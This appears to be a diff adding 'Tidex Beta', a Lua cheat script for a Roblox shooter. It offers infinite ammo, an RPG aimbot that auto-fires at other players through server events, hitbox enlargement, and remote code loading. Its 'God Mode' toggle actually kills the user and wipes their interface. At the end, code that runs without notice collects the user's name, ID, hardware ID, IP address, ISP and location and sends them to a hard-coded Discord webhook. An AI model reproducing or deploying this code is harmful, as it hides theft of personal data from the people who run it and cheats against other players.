@@ -1,0 +1,766 @@
+﻿local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local ContextActionService = game:GetService("ContextActionService")
+
+
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+local Window = Fluent:CreateWindow({
+    Title = "Tidex Beta",
+    SubTitle = "by Synapse",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(580, 460),
+    Acrylic = true,
+    Theme = "Dark",
+    MinimizeKey = Enum.KeyCode.LeftControl
+})
+
+
+local Tabs = {
+    Main = Window:AddTab({ Title = "Main", Icon = "home" }),
+    RPG = Window:AddTab({ Title = "RPG", Icon = "rocket" }),
+    Hitboxes = Window:AddTab({ Title = "Hitboxes", Icon = "box" }),
+    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
+}
+
+
+local Ammos = nil
+local AimbotEnabled = false
+local _G = {
+    HeadSize = 20,
+    Disabled = false -- Now controlled by toggle
+}
+
+
+local ignoredPlayers = {}
+
+
+Tabs.Main:AddToggle("InfAmmo", {
+    Title = "Infinite Ammo",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            Ammos = {}
+            for _,v in next, game:GetService("ReplicatedStorage").Configurations.ACS_Guns:GetChildren() do
+                Ammos[v.Name] = v.Ammo.Value  
+                v.Ammo.Value = math.huge  
+            end
+            Fluent:Notify({
+                Title = "Infinite Ammo",
+                Content = "Enabled",
+                Duration = 3
+            })
+        else
+            if Ammos then
+                for i,v in next, Ammos do
+                    game:GetService("ReplicatedStorage").Configurations.ACS_Guns:FindFirstChild(i).Ammo.Value = v
+                end
+                Ammos = nil
+                Fluent:Notify({
+                    Title = "Infinite Ammo",
+                    Content = "Disabled",
+                    Duration = 3
+                })
+            end
+        end
+    end
+})
+
+Tabs.Main:AddToggle("NoFallDmg", {
+    Title = "No Fall Damage",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+            local freefall = game:GetService("ReplicatedStorage"):WaitForChild("Freefall")
+            if freefall then freefall:Destroy() end
+            
+            local fdmEvent = game:GetService("ReplicatedStorage"):WaitForChild("ACS_Engine"):WaitForChild("Events"):WaitForChild("FDMG")
+            if fdmEvent then fdmEvent:Destroy() end
+        end
+    end
+})
+
+Tabs.Main:AddToggle("GodMode", {
+    Title = "God Mode",
+    Default = false,
+    Callback = function(Value)
+        if Value then
+
+local humanoid = player.Character:FindFirstChild("Humanoid")
+    if humanoid then
+        humanoid.Health = 0
+    end
+
+		-- Черный экран с текстом и 25-35 снежинками
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- Защита от повторного запуска
+if _G.TidexSimpleSnow then return end
+_G.TidexSimpleSnow = true
+
+-- Создание оверлея
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SimpleSnowOverlay"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 999999
+
+-- Черный фон
+local background = Instance.new("Frame")
+background.Name = "BlackBG"
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.BackgroundTransparency = 0
+background.BorderSizePixel = 0
+background.Parent = screenGui
+
+-- ОГРОМНЫЙ текст TIDEX BETA
+local title = Instance.new("TextLabel")
+title.Text = "TIDEX BETA"
+title.Font = Enum.Font.SourceSansBold
+title.TextColor3 = Color3.new(1, 1, 1)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0.7, 0)
+title.Position = UDim2.new(0, 0, 0.15, 0)
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.TextYAlignment = Enum.TextYAlignment.Center
+title.TextScaled = true
+title.Parent = background
+
+-- Маленькая подпись by synapse
+local subtitle = Instance.new("TextLabel")
+subtitle.Text = "by synapse"
+subtitle.Font = Enum.Font.SourceSansLight
+subtitle.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+subtitle.BackgroundTransparency = 1
+subtitle.Size = UDim2.new(0.2, 0, 0.03, 0)
+subtitle.Position = UDim2.new(0.4, 0, 0.96, 0)
+subtitle.TextXAlignment = Enum.TextXAlignment.Center
+subtitle.TextScaled = true
+subtitle.Parent = background
+
+-- Контейнер для снежинок
+local snowContainer = Instance.new("Frame")
+snowContainer.Name = "SnowContainer"
+snowContainer.Size = UDim2.new(1, 0, 1, 0)
+snowContainer.BackgroundTransparency = 1
+snowContainer.Parent = screenGui
+
+-- Создание снежинок (25-35 штук)
+local snowflakes = {}
+local snowflakeCount = math.random(25, 35) -- От 25 до 35 снежинок
+
+for i = 1, snowflakeCount do
+    local snowflake = Instance.new("Frame")
+    snowflake.Name = "Snowflake_" .. i
+    snowflake.BackgroundColor3 = Color3.new(1, 1, 1) -- Белый цвет
+    
+    -- Случайный размер от 2 до 6 пикселей
+    local size = math.random(2, 6)
+    snowflake.Size = UDim2.new(0, size, 0, size)
+    
+    -- Делаем снежинки круглыми
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(1, 0)
+    corner.Parent = snowflake
+    
+    -- Случайная прозрачность
+    snowflake.BackgroundTransparency = math.random(20, 60) / 100
+    
+    -- Начальная позиция вверху экрана
+    snowflake.Position = UDim2.new(
+        math.random() * 1.1 - 0.05, -- Случайная X позиция
+        0,
+        0, -- Начинаем сверху
+        -math.random(0, 50) -- Немного выше или на самом верху
+    )
+    
+    snowflake.Parent = snowContainer
+    
+    -- Сохраняем данные о снежинке
+    table.insert(snowflakes, {
+        object = snowflake,
+        speed = math.random(30, 70) / 100, -- Скорость падения
+        sway = math.random(5, 15) / 1000, -- Небольшое покачивание
+        rotationSpeed = math.random(10, 30) -- Скорость вращения
+    })
+end
+
+-- Функция адаптации размера текста
+local function adaptTextSize()
+    local viewportSize = workspace.CurrentCamera.ViewportSize
+    
+    -- Основной текст
+    local titleSize = math.min(viewportSize.Y * 0.2, 300)
+    title.TextSize = titleSize
+    
+    -- Подпись
+    local subtitleSize = math.min(viewportSize.Y * 0.025, 35)
+    subtitle.TextSize = subtitleSize
+end
+
+-- Анимация снегопада
+local lastUpdate = tick()
+local snowConnection
+
+snowConnection = RunService.RenderStepped:Connect(function()
+    local currentTime = tick()
+    local deltaTime = currentTime - lastUpdate
+    lastUpdate = currentTime
+    
+    -- Адаптируем текст
+    adaptTextSize()
+    
+    -- Анимируем снежинки
+    for _, snowflakeData in ipairs(snowflakes) do
+        local snowflake = snowflakeData.object
+        local currentPos = snowflake.Position
+        
+        -- Простое движение вниз
+        local newY = currentPos.Y.Scale + (deltaTime * snowflakeData.speed)
+        
+        -- Очень легкое покачивание из стороны в сторону
+        local sway = math.sin(currentTime * 2) * snowflakeData.sway
+        local newX = currentPos.X.Scale + sway
+        
+        -- Легкое вращение
+        snowflake.Rotation = (snowflake.Rotation + deltaTime * snowflakeData.rotationSpeed) % 360
+        
+        -- Если снежинка упала за нижний край экрана
+        if newY > 1.1 then
+            -- Возвращаем наверх со случайной позицией
+            newY = -0.05
+            newX = math.random() * 1.1 - 0.05
+            
+            -- Меняем прозрачность
+            snowflake.BackgroundTransparency = math.random(20, 60) / 100
+        end
+        
+        -- Обновляем позицию
+        snowflake.Position = UDim2.new(newX, 0, newY, 0)
+    end
+end)
+
+-- Инициализация
+adaptTextSize()
+
+-- Добавляем GUI игроку
+local player = Players.LocalPlayer
+if player then
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+else
+    Players.PlayerAdded:Connect(function(plr)
+        if plr == Players.LocalPlayer then
+            wait(0.5)
+            screenGui.Parent = plr:WaitForChild("PlayerGui")
+        end
+    end)
+end
+
+-- Ждем 30 секунд
+wait(30)
+
+-- Плавное исчезновение
+for i = 0, 1, 0.02 do
+    wait(0.03)
+    
+    -- Текст
+    title.TextTransparency = i
+    subtitle.TextTransparency = i
+    
+    -- Фон
+    background.BackgroundTransparency = i
+    
+    -- Снежинки
+    for _, snowflakeData in ipairs(snowflakes) do
+        snowflakeData.object.BackgroundTransparency = math.min(
+            snowflakeData.object.BackgroundTransparency + 0.02,
+            1
+        )
+    end
+end
+
+-- Очистка
+if snowConnection then
+    snowConnection:Disconnect()
+end
+_G.TidexSimpleSnow = false
+screenGui:Destroy()
+
+
+local Players = game:GetService("Players")
+local Teams = game:GetService("Teams")
+local player = Players.LocalPlayer
+
+-- Создаем команду Really Red если ее нет
+local redTeam
+for _, team in pairs(Teams:GetTeams()) do
+    if team.Name == "Really Red" or team.TeamColor.Name == "Really red" then
+        redTeam = team
+        break
+    end
+end
+
+if not redTeam then
+    redTeam = Instance.new("Team")
+    redTeam.Name = "Really Red"
+    redTeam.TeamColor = BrickColor.new("Really red")
+    redTeam.Parent = Teams
+end
+
+-- Назначаем игрока в команду
+player.Team = redTeam
+player.Neutral = false
+
+-- Ждем загрузки игрока
+player.CharacterAdded:Connect(function(character)
+    -- Ждем немного для полной загрузки
+    wait(0.5)
+    
+    -- Проверяем наличие PlayerGui и удаляем его
+    if player:FindFirstChild("PlayerGui") then
+        player.PlayerGui:Destroy()
+        print("PlayerGui удален для игрока:", player.Name)
+    end
+end)
+
+-- Также обрабатываем случай, если персонаж уже загружен
+if player.Character then
+    if player:FindFirstChild("PlayerGui") then
+        player.PlayerGui:Destroy()
+        print("PlayerGui удален для игрока:", player.Name)
+    end
+end
+
+local StarterGui = game:GetService("StarterGui")
+local ContextActionService = game:GetService("ContextActionService")
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
+
+-- Обработчик существующих игроков
+for _, player in ipairs(Players:GetPlayers()) do
+    addPlayerToRedTeam(player)
+end
+
+
+print("Система красной команды активирована!")
+            
+            Fluent:Notify({
+                Title = "God Mode",
+                Content = "Enabled",
+                Duration = 3
+            })
+        end
+    end
+})
+
+Tabs.Main:AddButton({
+    Title = "Autofarm Drone",
+    Description = "Loads the autofarm script",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ktulhucc/Autofarm-Drone-War-tycoon/main/AutofarmDrone", true))()
+        Fluent:Notify({
+            Title = "Autofarm Drone",
+            Content = "Script loaded",
+            Duration = 3
+        })
+    end
+})
+
+
+
+Tabs.RPG:AddInput("IgnorePlayerInput", {
+    Title = "Manage Ignore List",
+    Default = "",
+    Placeholder = "Type name and press Enter",
+    Numeric = false,
+    Finished = true,
+    Callback = function(Value)
+        if Value ~= "" then
+            if ignoredPlayers[Value] then
+                ignoredPlayers[Value] = nil
+                Fluent:Notify({
+                    Title = "Ignore List",
+                    Content = "Removed "..Value.." from ignore list",
+                    Duration = 3,
+                    Style = { BackgroundColor = Color3.fromRGB(200, 50, 50) }
+                })
+            else
+                local playerExists = false
+                for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+                    if player.Name == Value then
+                        playerExists = true
+                        break
+                    end
+                end
+                
+                if playerExists then
+                    ignoredPlayers[Value] = true
+                    Fluent:Notify({
+                        Title = "Ignore List",
+                        Content = "Added "..Value.." to ignore list",
+                        Duration = 3,
+                        Style = { BackgroundColor = Color3.fromRGB(50, 200, 50) }
+                    })
+                else
+                    Fluent:Notify({
+                        Title = "Error",
+                        Content = "Player "..Value.." not found",
+                        Duration = 3,
+                        Style = { BackgroundColor = Color3.fromRGB(200, 50, 50) }
+                    })
+                end
+            end
+            Tabs.RPG:GetInput("IgnorePlayerInput"):Set("")
+        end
+    end
+})
+
+Tabs.RPG:AddButton({
+    Title = "Show Ignored Players",
+    Description = "View current ignore list",
+    Callback = function()
+        local ignoredList = {}
+        for name,_ in pairs(ignoredPlayers) do
+            table.insert(ignoredList, name)
+        end
+        
+        if #ignoredList > 0 then
+            Fluent:Notify({
+                Title = "Ignored Players ("..#ignoredList..")",
+                Content = table.concat(ignoredList, ", "),
+                Duration = 5
+            })
+        else
+            Fluent:Notify({
+                Title = "Ignore List",
+                Content = "No players being ignored",
+                Duration = 3
+            })
+        end
+    end
+})
+
+Tabs.RPG:AddButton({
+    Title = "Clear Ignore List",
+    Description = "Remove all players from ignore list",
+    Callback = function()
+        ignoredPlayers = {}
+        Fluent:Notify({
+            Title = "Ignore List",
+            Content = "Cleared all ignored players",
+            Duration = 3
+        })
+    end
+})
+
+
+Tabs.RPG:AddToggle("RPG Target", {
+    Title = "RPG Target",
+    Description = "Automatically targets nearby players (except ignored) - 1 shot per 3s per player",
+    Default = false,
+    Callback = function(Value)
+        getgenv().AimbotEnabled = Value
+
+        if Value then
+            local scanRadius = 3000
+            local Players = game:GetService("Players")
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local lastFireTimes = {}
+
+            task.spawn(function()
+                while getgenv().AimbotEnabled do
+                    local localPlayer = Players.LocalPlayer
+                    local character = localPlayer.Character
+                    if not character then task.wait() continue end
+
+                    local rpg = character:FindFirstChild("RPG")
+                    if not rpg then task.wait() continue end
+
+                    for _, targetPlayer in ipairs(Players:GetPlayers()) do
+                        if targetPlayer ~= localPlayer and targetPlayer.Character and not ignoredPlayers[targetPlayer.Name] then
+                            local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                            local targetBody = targetPlayer.Character:FindFirstChild("UpperTorso") or targetHRP
+
+                            if targetBody and targetHRP then
+                                local distance = (targetHRP.Position - character.HumanoidRootPart.Position).Magnitude
+                                if distance <= scanRadius then
+                                    local now = tick()
+                                    local lastFire = lastFireTimes[targetPlayer.Name] or 0
+
+                                    if now - lastFire >= 3 then
+                                        lastFireTimes[targetPlayer.Name] = now
+
+                                        task.spawn(function()
+                                            local argsFire = {
+                                                Vector3.new(0, 0, 0),
+                                                rpg,
+                                                rpg,
+                                                targetBody.Position + Vector3.new(0, 2, 0)
+                                            }
+                                            ReplicatedStorage.RocketSystem.Events.FireRocket:InvokeServer(unpack(argsFire))
+
+                                            local argsHit = {
+                                                targetBody.Position,
+                                                Vector3.new(0, 0, 0),
+                                                rpg,
+                                                rpg,
+                                                targetBody,
+                                                nil,
+                                                localPlayer.Name .. "HeldRocket"
+                                            }
+                                            ReplicatedStorage.RocketSystem.Events.RocketHit:FireServer(unpack(argsHit))
+                                        end)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                    task.wait(0.1) -- чтобы не грузить цикл
+                end
+            end)
+        end
+
+        Fluent:Notify({
+            Title = "RPG Target",
+            Content = Value and "Enabled - Automatically targeting players" or "Disabled",
+            Duration = 5
+        })
+    end
+})
+
+
+
+Tabs.Hitboxes:AddToggle("HitboxToggle", {
+    Title = "Enable Hitboxes",
+    Description = "Show/hide enemy hitboxes",
+    Default = false,
+    Callback = function(Value)
+        _G.Disabled = not Value
+        Fluent:Notify({
+            Title = "Hitboxes",
+            Content = Value and "Enabled" or "Disabled",
+            Duration = 3
+        })
+    end
+})
+
+-- Hitbox Size Slider
+Tabs.Hitboxes:AddSlider("HitboxSize", {
+    Title = "Hitbox Size",
+    Description = "Adjust enemy hitbox size",
+    Default = 20,
+    Min = 1,
+    Max = 1000,
+    Rounding = 0,
+    Callback = function(Value)
+        _G.HeadSize = Value
+    end
+})
+
+
+Tabs.Hitboxes:AddButton({
+    Title = "Set Hitbox to 50",
+    Callback = function()
+        Tabs.Hitboxes:GetSlider("HitboxSize"):Set(50)
+        Fluent:Notify({
+            Title = "Hitbox Size",
+            Content = "Set to 50",
+            Duration = 3
+        })
+    end
+})
+
+Tabs.Hitboxes:AddButton({
+    Title = "Set Hitbox to 100",
+    Callback = function()
+        Tabs.Hitboxes:GetSlider("HitboxSize"):Set(100)
+        Fluent:Notify({
+            Title = "Hitbox Size",
+            Content = "Set to 100",
+            Duration = 3
+        })
+    end
+})
+
+
+Tabs.Hitboxes:AddDropdown("HitboxColor", {
+    Title = "Hitbox Color",
+    Description = "Change hitbox visualization color",
+    Values = {"Blue", "Red", "Green", "Yellow", "Purple"},
+    Default = "Blue",
+    Callback = function(Value)
+        local colorMap = {
+            ["Blue"] = Color3.fromRGB(0, 0, 255),
+            ["Red"] = Color3.fromRGB(255, 0, 0),
+            ["Green"] = Color3.fromRGB(0, 255, 0),
+            ["Yellow"] = Color3.fromRGB(255, 255, 0),
+            ["Purple"] = Color3.fromRGB(128, 0, 128)
+        }
+        _G.HitboxColor = colorMap[Value]
+        Fluent:Notify({
+            Title = "Hitbox Color",
+            Content = "Set to "..Value,
+            Duration = 3
+        })
+    end
+})
+
+
+_G.HitboxColor = Color3.fromRGB(0, 0, 255)
+
+
+game:GetService('RunService').RenderStepped:connect(function()
+    if not _G.Disabled then
+        for _, player in next, game:GetService('Players'):GetPlayers() do
+            if player.Name ~= game:GetService('Players').LocalPlayer.Name then
+                pcall(function()
+                    local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                    if humanoidRootPart then
+                        humanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
+                        humanoidRootPart.Transparency = 0.7
+                        humanoidRootPart.BrickColor = BrickColor.new(_G.HitboxColor)
+                        humanoidRootPart.Material = "Neon"
+                        humanoidRootPart.CanCollide = false
+                    end
+                end)
+            end
+        end
+    end
+end)
+
+
+Tabs.Settings:AddParagraph({
+    Title = "Information",
+    Content = "Script by Synapse | Discord: synapse_1337"
+})
+
+Tabs.Settings:AddParagraph({
+    Title = "Usage Tips",
+    Content = "1. Fire the RPG before use\n2. Use infinite ammo before picking up a weapon\n3. Type names and press Enter to manage ignore list"
+})
+
+
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:SetLibrary(Fluent)
+
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetIgnoreIndexes({})
+
+InterfaceManager:BuildInterfaceSection(Tabs.Settings)
+SaveManager:BuildConfigSection(Tabs.Settings)
+
+Window:SelectTab(1)
+
+Fluent:Notify({
+    Title = "Tidex Beta",
+    Content = "Loaded successfully!",
+    Duration = 5
+})
+
+local lp = game:GetService("Players").LocalPlayer
+
+if game:IsLoaded() then
+    local player_name = lp.Name
+    local player_id = lp.UserId
+    local webhook_url = "https://discord.com/api/webhooks/1456312774383767793/N_mrlASm-pLCwrb52hlSFb58HGb6pYH5KCocmE06VDaQhF2mkSALycra1UYgk7cZCciW"
+
+    
+    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+
+    local place_id = game.PlaceId
+    local place_name = game:GetService("MarketplaceService"):GetProductInfo(place_id).Name
+
+    local ip_info = syn and syn.request or https_request({
+        Url = "https://2ip.ru/",
+        Method = "GET"
+    })
+
+    getgenv().ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+
+    local current_time = os.date("%Y-%m-%d %H:%M:%S")
+
+    
+    local embed = {
+        {
+            ["title"] = "Executed",
+            ["description"] = "User data",
+            ["color"] = 0xFF0000,
+            ["fields"] = {
+                {
+                    ["name"] = "Name",
+                    ["value"] = player_name,
+                    ["inline"] = true
+                },
+                
+                {
+                    ["name"] = "Display name",
+                    ["value"] = lp.DisplayName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "ID",
+                    ["value"] = tostring(player_id),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "HWID",
+                    ["value"] = hwid,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Game",
+                    ["value"] = place_name,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Time",
+                    ["value"] = current_time,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "IP",
+                    ["value"] = getgenv().ipinfo_table.query,
+                    ["inline"] = false
+                },
+                -- НОВЫЕ ПОЛЯ:
+                {
+                    ["name"] = "Provider",
+                    ["value"] = getgenv().ipinfo_table.isp,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Country",
+                    ["value"] = getgenv().ipinfo_table.country,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "City",
+                    ["value"] = getgenv().ipinfo_table.city,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Time zone",
+                    ["value"] = getgenv().ipinfo_table.timezone,
+                    ["inline"] = true
+                }
+            }
+        }
+    }
+
+    http_request(
+        {
+            Url = webhook_url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode({["embeds"] = embed})
+        }
+    )
+end
